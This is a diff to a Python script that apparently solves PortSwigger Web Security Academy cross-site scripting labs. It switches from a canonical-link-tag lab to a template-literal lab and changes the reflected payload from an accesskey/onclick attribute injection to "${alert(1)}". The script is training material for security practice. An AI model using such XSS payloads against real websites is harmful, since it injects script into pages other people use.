@@ -6,19 +6,19 @@ from bs4 import BeautifulSoup
 
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
-# lab_url: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag
+# lab_url: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped
 # author: 0xyf
 
 
-class XSS17:
+class XSS21:
     def __init__(self):
-        self.lab_id = "0a3e0078038d8071d0598293004a0056"
+        self.lab_id = "0a0d001004536d5c8001808800810083"
         self.proxies = {"https": "http://127.0.0.1:8080"}
 
         self.url = f"https://{self.lab_id}.web-security-academy.net"
 
     def execute_request(self, payload):
-        params = {"0xyf": payload}
+        params = {"search": payload}
         r = requests.get(
             self.url,
             params=params,
@@ -28,7 +28,7 @@ class XSS17:
         return r
 
     def reflected_xss(self):
-        payload = "'accesskey='X'onclick='alert(1)"
+        payload = "${alert(1)}"
         r = self.execute_request(payload)
 
     def check_solved(self):
@@ -45,7 +45,7 @@ class XSS17:
 
 
 def main():
-    XSS17().solve()
+    XSS21().solve()
 
 
 if __name__ == "__main__":
